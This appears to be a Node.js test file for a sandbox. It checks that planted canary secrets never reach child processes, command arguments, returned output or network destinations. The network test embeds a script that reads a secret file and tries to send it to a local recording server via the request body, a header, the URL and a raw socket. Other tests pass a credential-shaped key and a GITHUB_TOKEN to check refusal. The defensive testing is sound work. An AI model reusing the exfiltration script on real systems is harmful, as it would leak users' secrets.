// Canary fixtures: a secret planted in the environment, on the filesystem or on
// the network must never reach a child, a descendant, an interpreter, an allowed
// command's arguments, a returned result or a destination.
//
// A canary is a unique value whose only possible route to the assertion is a
// leak, so each test asserts its absence in the WHOLE serialized result as well
// as in the specific channel under test. A passing run proves those routes were
// closed here; it does not prove the sandbox is universally secure.
import { test, describe, before, after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { SKIP, bind, run, tmp, recordingServer } from './helpers.js';

const uniq = (p) => `${p}-${process.pid}-${Math.random().toString(36).slice(2, 10)}`;

describe('[X-503.AC01] environment canaries never reach a child, a descendant or an interpreter', { skip: SKIP }, () => {
  const NAME = 'AGSEC_FIXTURE_CANARY_ENV';
  let value; let w;
  before(() => { value = uniq('CANARY-ENV'); process.env[NAME] = value; w = tmp('canenv-'); });
  after(() => { delete process.env[NAME]; });

  test('a scoped shell, a nested shell, a scoped interpreter and its child all see a scrubbed environment (env itself is refused)', async () => {
    const shScript = 'env; sh -c env; ( env )';
    const nodeScript = `console.log(JSON.stringify(process.env));console.log(require('child_process').execFileSync('/usr/bin/env',{encoding:'utf8'}))`;
    const bound = bind({
      filesystem: { write: [w] },
      commands: [
        { executable: '/usr/bin/env', args: { mode: 'any' } },
        { executable: '/bin/sh', interpreter: 'scoped', args: { mode: 'exact', values: ['-c', shScript] } },
        { executable: process.execPath, interpreter: 'scoped', args: { mode: 'exact', values: ['-e', nodeScript] } },
      ],
    });
    // env itself is an interpreter-class launcher, so the first attempt is refused, which is also correct;
    // the scrubbed environment is then observed through the scoped shell and interpreter.
    const direct = await run(bound, { executable: '/usr/bin/env', args: [] });
    assert.equal(direct.status, 'blocked');
    for (const [exe, args] of [['/bin/sh', ['-c', shScript]], [process.execPath, ['-e', nodeScript]]]) {
      const r = await run(bound, { executable: exe, args });
      assert.equal(r.executed, true, JSON.stringify({ s: r.status, c: r.code, m: r.reason }));
      const text = JSON.stringify(r);
      assert.ok(!text.includes(value), 'the value is nowhere in the result');
      assert.ok(!text.includes(NAME), 'not even the variable name reached the task');
      assert.match(r.output.stdout, /ROOT=/, 'the minimal constructed environment is what the task saw');
    }
  });

  test('an environment handed to the task explicitly is checked: secrets and registered canaries are refused', async () => {
    const bound = bind({ filesystem: { write: [w] }, commands: [{ executable: '/usr/bin/true', args: { mode: 'any' } }] });
    const req = { executable: '/usr/bin/true', args: [] };
    const named = await run(bound, { ...req, env: { GITHUB_TOKEN: 'x', MODE: 'fast' } });
    assert.equal(named.status, 'blocked');
    assert.match(named.reason, /GITHUB_TOKEN/);
    const reg = await run(bound, { ...req, env: { NOTE: `prefix ${value} suffix` } }, { canaries: [value] });
    assert.equal(reg.status, 'blocked');
    assert.ok(!JSON.stringify(reg).includes(value));
    const nonString = await run(bound, { ...req, env: { N: 5 } });
    assert.equal(nonString.status, 'blocked');
    const fine = await run(bound, { ...req, env: { MODE: 'fast' } });
    assert.equal(fine.status, 'ok', 'a harmless explicit variable is allowed');
  });
});

describe('[X-503.AC01] canaries never travel in an allowed command\'s arguments, and never come back in its output', { skip: SKIP }, () => {
  let w; let ro; let value;
  before(() => {
    w = tmp('canarg-'); ro = path.join(w, 'ro'); fs.mkdirSync(ro);
    value = uniq('CANARY-ARG');
    fs.writeFileSync(path.join(ro, 'data.txt'), `line one\ntoken is ${value}\nline three\n`);
  });

  test('a registered canary, or a provider-shaped credential, in any argument blocks the run before it starts', async () => {
    const marker = path.join(w, 'ran');
    const bound = bind({ filesystem: { write: [w] }, commands: [{ executable: '/usr/bin/touch', args: { mode: 'any' } }] });
    for (const arg of [`${marker}-${value}`, `${marker}.sk_${'live'}_4eC39HqLyjWDarjtT1zdp7dc`]) {
      const r = await run(bound, { executable: '/usr/bin/touch', args: [arg] }, { canaries: [value] });
      assert.equal(r.status, 'blocked');
      assert.equal(r.policyCode, 'secret-in-argument');
      assert.equal(r.executed, false);
      assert.ok(!JSON.stringify(r).includes(value) && !JSON.stringify(r).includes('4eC39HqLyjWDarjtT1zdp7dc'), 'the refusal does not echo the secret');
    }
    assert.equal(fs.readdirSync(w).filter((n) => n.startsWith('ran')).length, 0, 'nothing was created');
  });

  test('a canary the task legitimately reads is scrubbed from the output it hands back', async () => {
    const bound = bind({ filesystem: { read: [ro] }, commands: [{ executable: '/bin/cat', args: { mode: 'any' } }] });
    const plain = await run(bound, { executable: '/bin/cat', args: [path.join(ro, 'data.txt')] });
    assert.ok(plain.output.stdout.includes(value), 'without a registered canary the file is returned as read (positive control)');
    const guarded = await run(bound, { executable: '/bin/cat', args: [path.join(ro, 'data.txt')] }, { canaries: [value] });
    assert.ok(!JSON.stringify(guarded).includes(value), 'with the canary registered it is removed from the whole result');
    assert.match(guarded.output.stdout, /line one/);
    assert.match(guarded.output.stdout, /\[REDACTED-SECRET\]/);
  });
});

describe('[X-504.AC02] a network canary the task reads and tries to send is filtered or blocked on every route', { skip: SKIP }, () => {
  let w; let ro; let value; let S;
  before(async () => {
    w = tmp('cannet-'); ro = path.join(w, 'ro'); fs.mkdirSync(ro);
    value = uniq('CANARY-NET');
    fs.writeFileSync(path.join(ro, 'data.txt'), value);
    S = await recordingServer();
  });
  after(async () => { await S.close(); });

  test('exfiltration through the body, a header, the URL and a direct socket does not deliver the canary', async () => {
    const script = `
const fs=require('fs'),http=require('http'),net=require('net');
const px=new URL(process.env.HTTP_PROXY);
const c=fs.readFileSync(${JSON.stringify(path.join(ro, 'data.txt'))},'utf8');
const send=(p,u,h,b)=>new Promise(r=>{const q=http.request({host:px.hostname,port:px.port,method:'POST',path:u,headers:{host:'127.0.0.1:'+p,'content-length':Buffer.byteLength(b),...h},agent:false},res=>{res.resume();res.on('end',()=>r(res.statusCode))});q.on('error',e=>r(e.code));q.end(b)});
(async()=>{
 const base='http://127.0.0.1:${S.port}/x';
 const out={};
 out.body=await send(${S.port},base,{'content-type':'application/json'},JSON.stringify({note:c,deep:{list:[c]}}));
 out.header=await send(${S.port},base,{'x-note':c,'x-trace-id':'t-1'},'{}');
 out.url=await send(${S.port},base+'?data='+encodeURIComponent(c)+'&p='+Buffer.from(c).toString('base64'),{},'{}');
 out.direct=await new Promise(r=>{const s=net.connect(${S.port},'127.0.0.1');s.on('connect',()=>{s.write('POST /x HTTP/1.1\\r\\nhost: x\\r\\ncontent-length: '+c.length+'\\r\\n\\r\\n'+c);r('CONNECTED')});s.on('error',e=>r(e.code));setTimeout(()=>r('TIMEOUT'),2500)});
 console.log(JSON.stringify(out));
})();`;
    const bound = bind({
      filesystem: { read: [ro], write: [w] },
      network: [{ host: '127.0.0.1', port: S.port, schemes: ['http'] }],
      commands: [{ executable: process.execPath, interpreter: 'scoped', args: { mode: 'exact', values: ['-e', script] } }],
      resources: { timeoutMs: 20000 },
    });
    const r = await run(bound, { executable: process.execPath, args: ['-e', script] }, { canaries: [value] });
    assert.equal(r.executed, true, JSON.stringify({ s: r.status, c: r.code, m: r.reason, e: r.output?.stderr }));
    const out = JSON.parse(r.output.stdout.trim().split('\n').pop());
    assert.equal(out.body, 200); assert.equal(out.header, 200); assert.equal(out.url, 200);
    assert.equal(out.direct, 'EPERM', 'the direct route is closed by the operating system');
    assert.equal(S.seen.requests.length, 3, 'exactly the three proxied requests arrived');
    const everything = JSON.stringify(S.seen.requests);
    for (const form of [value, encodeURIComponent(value), Buffer.from(value).toString('base64')]) {
      assert.ok(!everything.includes(form), `the destination received ${form.slice(0, 18)}...`);
    }
    assert.equal(S.seen.requests[1].headers['x-trace-id'], 't-1', 'unrelated headers pass');
    assert.ok(!JSON.stringify(r).includes(value), 'and the canary is nowhere in the result');
    assert.ok(r.network.stats.redactions >= 3);
  });
});
